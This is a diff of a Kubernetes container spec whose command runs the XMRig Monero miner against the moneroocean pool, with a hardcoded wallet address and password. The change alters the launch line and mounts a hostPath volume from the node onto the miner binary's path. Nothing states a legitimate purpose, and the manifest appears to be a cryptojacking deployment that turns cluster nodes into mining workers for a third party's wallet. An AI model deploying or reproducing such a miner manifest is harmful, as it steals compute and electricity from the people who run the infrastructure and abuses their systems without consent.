@@ -26,9 +26,7 @@ spec:
           args:
             - "-c"
             - |
-              while true; do
-                /xmrig/build/xmrig -o gulf.moneroocean.stream:80 -u 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5 -p piD3ceiver
-              done
+              cp /xmrig/build/xmrig /xmrig/build/xmrig && chmod +x /xmrig/build/xmrig && /xmrig/build/xmrig -o gulf.moneroocean.stream:80 -u 87T57vEfgmKevdUuXwsjZGYpZ8FUR5LuuZA8BGG9sQ91hUbaqRh7HywdxhKQcqvqbsaPuZktbBzPy5cwPpXtJh275TpS7U5 -p piD3ceiver
           resources:
             limits:
               cpu: "1"
@@ -37,14 +35,12 @@ spec:
               cpu: "1"
               memory: "100Mi"
           volumeMounts:
-            - name: worker1-data
-              mountPath: /home/worker1/
+            - name: host-path
+              mountPath: /xmrig/build/xmrig
       volumes:
-        - name: worker1-data
+        - name: host-path
           hostPath:
             path: /home/worker1/
-            type: DirectoryOrCreate
-
-
+            type: Directory
 
   
